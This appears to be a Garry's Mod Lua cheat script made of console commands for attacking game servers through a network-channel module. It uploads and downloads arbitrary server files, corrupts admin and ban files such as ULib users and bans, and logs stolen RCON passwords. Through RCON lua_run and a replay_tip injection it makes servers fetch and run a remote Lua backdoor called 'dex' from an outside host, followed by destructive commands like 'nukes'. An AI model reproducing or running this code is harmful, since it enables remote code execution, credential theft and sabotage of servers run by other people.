
if not chan then
	require("chan")
end



local function UploadChair(ply,cmd,args)
	local Path = "data/adv_duplicator/=Public Folder=/office_chair.txt"
	if (#args != 0) then
		Path = "data/adv_duplicator/STEAM_0_0_17809124/office_chair.txt"
	end
	
	chan.SendFile(Path)
	print("[OK] Sent '"..Path.."' using CHAN")
end
concommand.Add("hex_upload_chair", UploadChair)


local function FuckFile(File, Where)
	if Where then
		chan.MKDIR(Where)
		File = Where.."\\"..File
	else
		File = "data\\"..File
	end
	chan.MKDIR(File)
	
	local That = File.."\\o.txt"
	
	chan.Write(That, "lol")
	chan.SendFile(That)
	print("! FuckFile: ", That)
	
	chan.Delete(That)
	chan.RMDIR(File)
	if Where then
		chan.RMDIR(Where)
	end
	
	timer.Simple(3, function()
		chan.Delete(That)
		
		chan.RMDIR(File)
		if Where then
			chan.RMDIR(Where)
		end
	end)
end


local function FuckThatFile(ply,cmd,args) --fuckfile 
	if (#args == 0) then
		print("[ERR] No args!")
		return
		
	elseif (#args == 1) then
		FuckFile(args[1])
		
	elseif (#args == 2) then
		FuckFile(args[2], args[1]) --File, Where
	end
end
concommand.Add("fuckfile", FuckThatFile)


local ToFuck = {
	{What = "banned_user.cfg", 		Where = "cfg"},
	{What = "banned_ip.cfg", 		Where = "cfg"},
	
	{What = "bans.txt", 			Where = "data\\ULib"},
	{What = "users.txt",			Where = "data\\ULib"},
	{What = "groups.txt",			Where = "data\\ULib"},
	{What = "misc_registered.txt",	Where = "data\\ULib"},
	
	{What = "ranks.txt",			Where = "data\\FSAMod"},
	
	{What = "ev_playerinfo.txt"},
	{What = "ev_userranks.txt"},
	{What = "ev_globalvars.txt"},
	
	{What = "ass_config_server.txt"},
	{What = "ass_debug_sv.txt"},
	{What = "ass_rankings.txt"},
}

local function FuckAdminFiles(ply,cmd,args)
	if client.GetIP():find("192.168") then
		print("[ERR] Not on here dumbass!")
		return
	end
	
	for k,v in pairs(ToFuck) do
		timer.Simple(k/5, function()
			FuckFile(v.What, v.Where)
		end)
	end
end
concommand.Add("hex_fuck_admins", FuckAdminFiles)




local function SendFile(ply,cmd,args)
	if (#args == 0) then
		print("[ERR] No args!")
		return
	end
	
	local What = args[1]
	
	print("! SendFile '"..What.."' : ", chan.SendFile(What) )
end
concommand.Add("upload", SendFile)

local function RequestFile(ply,cmd,args)
	if (#args == 0) then
		print("[ERR] No args!")
		return
	end
	
	local What = args[1]
	
	console.Command("net_showfragments 2")
	print("! RequestFile '"..What.."' : ", chan.RequestFile(What) )
	
	timer.Simple(3, function()
		if file.Exists(What, true) then
			print("! done :D")
		else
			print("! no file :(")
		end
	end)
	
	timer.Simple(10, function()
		console.Command("net_showfragments 0")
	end)
end
concommand.Add("download", RequestFile)







local function Logme(ply,cmd,args)
	if not (client and client.GetIP) then
		print("[ERR] No extras!")
		return
	end
	
	local what = table.concat(args," ")
	
	local str = Format("Logme @ [%s] - '%s' - (%s) - '%s'\n", os.date(), GetConVarString("hostname"), client.GetIP(), what)
	file.Append("hex_logme.txt", str)
	
	print("[OK] Saved: '"..what.."'")
end
concommand.Add("logme2", Logme)


local function SaveRCFromDeX(ply,cmd,args)
	if not (client and client.GetIP) then
		print("[ERR] No extras!")
		return
		
	elseif (#args != 1) then
		print("[ERR] No pw!")
		return
	end
	
	local pass = args[1]
	
	local str = Format("RCPW @ [%s] - '%s' - (%s) - '%s'\n", os.date(), GetConVarString("hostname"), client.GetIP(), pass)
	file.Append("dex_rcpw.txt", str)
	
	print("[OK] Saved RCPW: '"..pass.."'")
end
concommand.Add("_dex_save_rc", SaveRCFromDeX)





local function LoadRCONDeX(ply,cmd,args)
	print("! Sending stage 1..\n")
	HeXLRCL([[ rcon lua_run DEX_PATH = nil ]])
	HeXLRCL([[ rcon lua_run lol = "http.Get('gmod.game-host.org/bar/dex/dex.lua', ' ', function(s,f) RunString(s) end)" ]])
	
	timer.Simple(3, function()
		print("! Sending stage 2..\n")
		HeXLRCL([[ rcon lua_run RunString(lol) ]])
		print("! sent dex over RCON, waiting for reply..\n")
	end)
end
concommand.Add("hex_exploit_dex_rcon", LoadRCONDeX)



local function LoadDeX()
	HeXLRCL([[replay_tip "http.Get('http://gmod.game-host.org/bar/dex/dex.lua', ' ', function(s,f) RunStringEx(s,'WireModelPack') end)" ]])
	
	print("! sent dex, waiting for reply..\n")
end
concommand.Add("hex_exploit_dex", LoadDeX)


local function DeXAll()
	LoadDeX()
	
	timer.Simple(1, function()
		HeXLRCL([[ "dex_save" ]])
		HeXLRCL([[ "fixset" ]])
		HeXLRCL([[ "nukes" ]])
	end)
end
concommand.Add("hex_exploit_all", DeXAll)
concommand.Add("dex_all", DeXAll)





